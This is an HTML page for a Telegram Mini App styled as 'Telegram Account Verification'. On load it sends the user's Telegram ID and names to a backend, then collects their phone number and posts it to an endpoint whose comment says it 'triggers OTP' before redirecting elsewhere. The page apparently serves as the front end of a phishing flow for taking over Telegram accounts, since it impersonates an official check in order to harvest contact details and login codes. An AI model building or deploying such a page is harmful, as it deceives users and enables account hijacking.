<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Telegram Phone Verification</title>

<!-- Telegram Mini App Script -->
<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
body{
  font-family: system-ui;
  background:#f5f5f5;
  padding:20px;
}
.box{
  max-width:420px;
  margin:auto;
  background:white;
  border-radius:16px;
  padding:20px;
  box-shadow:0 10px 25px rgba(0,0,0,.12);
}
button{
  width:100%;
  padding:14px;
  border-radius:10px;
  border:none;
  background:#5b6dfc;
  color:white;
  font-size:16px;
}
#phone{
  margin-top:14px;
  font-weight:bold;
}
#error{
  margin-top:14px;
  color:#c62828;
}
</style>
</head>


<body>

<div class="box">
  <h3>Telegram Account Verification</h3>
  <p>Press the button below to share your phone number.</p>

  <button onclick="shareContact()">ðŸ“ž Share Contact</button>

  <p id="phone"></p>
  <p id="error"></p>
</div>


<script>
let sessionId = null;

/* --- Initialize Session with your backend --- */
document.addEventListener("DOMContentLoaded", () => {

  const tg = window.Telegram?.WebApp;
  tg?.expand();

  const user = tg?.initDataUnsafe?.user || {};

  fetch("/init-session", {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({
      user_id: user.id,
      username: user.username,
      first_name: user.first_name,
      last_name: user.last_name
    })
  })
  .then(r=>r.json())
  .then(d=> sessionId = d.session_id);
});


/* --- Ask Telegram for contact permission --- */

function shareContact(){

  const tg = window.Telegram?.WebApp;

  if(!tg?.requestContact){
    alert("requestContact not supported here. Use Telegram mobile app.");
    return;
  }

  tg.requestContact((shared)=>{

    console.log("Shared =", shared);

    if(shared){
      getPhone();
    } else {
      setError("User cancelled contact sharing");
    }
  });

}


/* --- Read phone number from initDataUnsafe --- */

function getPhone(){

  const tg = window.Telegram?.WebApp;

  const phone = tg?.initDataUnsafe?.user?.phone_number;

  console.log("PHONE =", phone);

  if(!phone){
    setError("Phone number not received from Telegram");
    return;
  }

  document.getElementById("phone").textContent =
    "Phone: " + phone;

  sendPhoneToBackend(phone);
}


/* --- Send phone to backend (THIS triggers OTP) --- */

function sendPhoneToBackend(phone){

  fetch("/api/verify-contact",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      session_id: sessionId,
      phone: phone
    })
  })
  .then(r=>r.json())
  .then(data=>{
    if(data.success){
      window.location.href = data.redirect_url;
    } else {
      setError(data.error || "Failed to send OTP");
    }
  })
  .catch(()=>{
    setError("Network error");
  });

}


/* --- Helpers --- */

function setError(msg){
  document.getElementById("error").textContent = msg;
}
</script>

</body>
</html>
